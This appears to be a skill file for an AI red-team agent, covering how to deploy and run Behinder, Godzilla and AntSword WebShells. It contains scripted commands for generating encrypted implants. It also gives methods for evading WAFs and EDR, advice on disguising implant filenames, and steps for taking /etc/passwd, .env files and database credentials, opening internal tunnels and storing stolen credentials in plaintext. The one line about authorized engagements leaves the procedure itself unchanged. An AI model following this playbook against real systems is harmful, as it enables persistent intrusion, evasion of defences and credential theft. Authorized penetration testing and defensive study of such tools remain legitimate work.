---
name: webshell-toolkit
description: "Launch and operate Behinder, Godzilla, and AntSword to deploy and manage WebShells, maintain persistence, and operate target file systems"
whenToUse: "When file upload, arbitrary file write, or command execution vulnerabilities are identified and require persistent WebShell deployment and interactive access"
role: exploit
enabled: true
---

# WebShell Toolkit (Deployment & Management)

Located at `$DSH_HOME/redteam/toolkit/`, Java 25 installed.

## Mandatory Standard: Deploy Encrypted Shells (Behinder / Godzilla)

**The operator directly interacts with the target using Behinder or Godzilla client interfaces**, therefore:
- **Deploy only Behinder or Godzilla encrypted implants by default**, and register `shell_type` + `pass_key` in `redteam_webshell_add`.
- **Ephemeral one-liners (`?cmd=`), custom stubs, or memory-only stubs do NOT constitute valid deliverables**: they lack persistent interactive operator interfaces. They may serve as **temporary pivots** (e.g. to drop the primary implant or launch a tunnel), and must be noted as "temporary staging pivot, non-deliverable entry".
- Godzilla GUI generation requires manual interaction; **prioritize headless Behinder shell generation**, producing deliverable implants via single CLI commands.

## Headless Behinder Shell Generation (Recommended & Scriptable)

Behinder implants embed an encryption key derived from: `key = md5(password)[:16]`. Built-in templates:
`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`

```bash
TK=$DSH_HOME/redteam/toolkit
PASS='Rt@2026#xz'                       # Connection password (generate randomly; do not use rebeyond)
KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # Behinder expects first 16 chars of 32-char MD5
# JSP: Replace embedded default key
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
# PHP: Replace embedded key ($key variable)
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
echo "Password: $PASS | Key: $KEY"      # Record both into runs/ and redteam_webshell_add
```

- Default key `e45e329feb5d925b` = `md5("rebeyond")[:16]` — **always replace with a custom password**; using default credentials risks defensive interception.
- Under strict WAF environments, deploy Unicode-escaped variant `shell_uni.jsp`: replace key characters with `\u00xx` sequences (scriptable via Python).
- Verified: All 7 templates (`shell.jsp`, `shell.jspx`, `shell_java9.jsp`, `shell.php`, `shell.aspx`, `shell.ashx`, `shell.asp`) support the single `sed` command substitution above.

Godzilla Implants (When GUI is needed):
```bash
DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
# Management -> Generate: Payload java/jsp, Encryptor Java_AES_BASE64, random password and key -> generate and upload
```

## Post-Upload Connectivity Verification (Mandatory)

1. Verify HTTP response: `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` -> Expected `200` (do not pass GET `cmd` parameters; encrypted shells do not evaluate plaintext queries).
2. Create connection in Behinder or Godzilla GUI (URL + connection password) and click "Test Connection" -> verified connectivity confirms success; execute `id` / `whoami` in virtual terminal.
3. Complete ledger registration: `url`, `shell_type=behinder|godzilla`, `pass_key=<password>`, `privilege`, and `secret_ref` (evidence file); **immediately establish a suo5 tunnel** (`suo5-tunnel`).

## Toolkit Overview

| Tool | Launch Command | Features |
| --- | --- | --- |
| Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES encrypted traffic, JSP/PHP/ASPX |
| Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | Full-traffic encryption payloads for JSP/PHP/ASPX |
| AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | Select source directory `antSword-2.1.16` on first run |
| suo5 tunnel | `./suo5-linux-amd64` | See `suo5-tunnel` skill |

## Standard Operational Lifecycle

1. **Identify Entry Point**: Arbitrary file upload, arbitrary file write, administrative plugin install, template injection, or SQL `INTO OUTFILE`.
2. **Generate Payload**: Match target language (JSP/JSPX/PHP/ASPX) using headless Behinder generation; record credentials under `runs/`.
3. **Deploy & Inspect**: Ensure `curl` returns HTTP 200. Avoid predictable filenames like `/shell.jsp`; disguise implant names to match target web assets.
4. **Connection Verification**: Configure target URL + password in management client and test connection; verify command execution via terminal.
5. **Persistence & Exploitation**:
   - Harvest environment details: `id`, `whoami`, `hostname`, `uname -a`, users, network interfaces, routes.
   - **Immediately launch a suo5 tunnel into the internal network** (`suo5-tunnel`).
   - Extract sensitive files: `/etc/passwd`, configurations, `.env`, source code, database connection strings -> save under `runs/`.
6. **Ledger Registration**:
   - `redteam_webshell_add` (`url`, `shell_type`, `pass_key`, `privilege`, `secret_ref`)
   - `redteam_access_add` (`host`, `username`, `method="webshell"`, `privilege`, `session_ref`)
   - `redteam_vuln_update` (mark entry vulnerability as `exploited`)
   - `redteam_http_evidence_add` (save upload request and shell invocation request)
   - `redteam_chain_add` (`stage=exploit/access`)

## Ephemeral Command Execution (Intermediate Staging)

When only single-shot execution is needed to deploy the primary implant, use existing RCE without leaving plaintext shells:
```bash
# Example: Ephemeral parameter execution (remove immediately after dropping primary implant)
curl -s "https://target.example.com/upload/x.jsp?cmd=id"
```

## Operational Safety & Rules

- Uploaded shells must target **authorized engagement systems only**; perform complete removal and cleanup at engagement completion.
- Client GUI tools require a graphical desktop session (`DISPLAY=:10.0` or equivalent).
- Register credentials via `redteam_credential_add`: **store plaintext in `secret_value`** (for direct UI dashboard visibility) and reference evidence paths under `runs/` in `secret_ref`. Keep all findings local to the operator host.
- Defensive EDR awareness: If an implant fails or gets deleted, pivot language/encoding variants (JSP -> JSPX -> PHP) or relocate to an alternative web directory.
